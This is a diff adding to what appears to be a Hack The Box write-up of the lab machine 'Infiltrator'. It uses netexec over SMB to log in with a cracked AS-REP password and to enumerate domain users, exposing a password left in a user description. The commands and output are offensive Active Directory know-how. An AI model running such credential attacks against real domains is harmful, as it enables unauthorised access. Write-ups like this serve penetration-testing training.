@@ -198,5 +198,32 @@ $krb5asrep$23$l.clark@INFILTRATOR.HTB:192232ede506ead876ad8384319c6ce7$0429782ae
 The hash cracked
 
 ```python
-
+nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!'              
+SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.99   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
 ```
+
+This user is compromised
+
+# Password stored in user descriptions
+```python
+nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!' --users
+SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.99   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
+SMB         10.129.232.99   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.232.99   445    DC01             Administrator                 2024-08-21 19:58:28 0       Built-in account for administering the computer/domain 
+SMB         10.129.232.99   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.232.99   445    DC01             krbtgt                        2023-12-04 17:36:16 0       Key Distribution Center Service Account 
+SMB         10.129.232.99   445    DC01             D.anderson                    2023-12-04 18:56:02 0        
+SMB         10.129.232.99   445    DC01             L.clark                       2023-12-04 19:04:24 0        
+SMB         10.129.232.99   445    DC01             M.harris                      2026-10-04 15:41:43 0        
+SMB         10.129.232.99   445    DC01             O.martinez                    2024-02-25 15:41:03 0        
+SMB         10.129.232.99   445    DC01             A.walker                      2023-12-05 22:06:28 0        
+SMB         10.129.232.99   445    DC01             K.turner                      2024-02-25 15:40:35 0       MessengerApp@Pass! 
+SMB         10.129.232.99   445    DC01             E.rodriguez                   2026-10-04 15:41:43 0        
+SMB         10.129.232.99   445    DC01             winrm_svc                     2024-08-02 22:42:45 0        
+SMB         10.129.232.99   445    DC01             lan_managment                 2024-08-02 22:42:46 0        
+SMB         10.129.232.99   445    DC01             [*] Enumerated 12 local users: INFILTRATOR
+```
+
+Found another password 
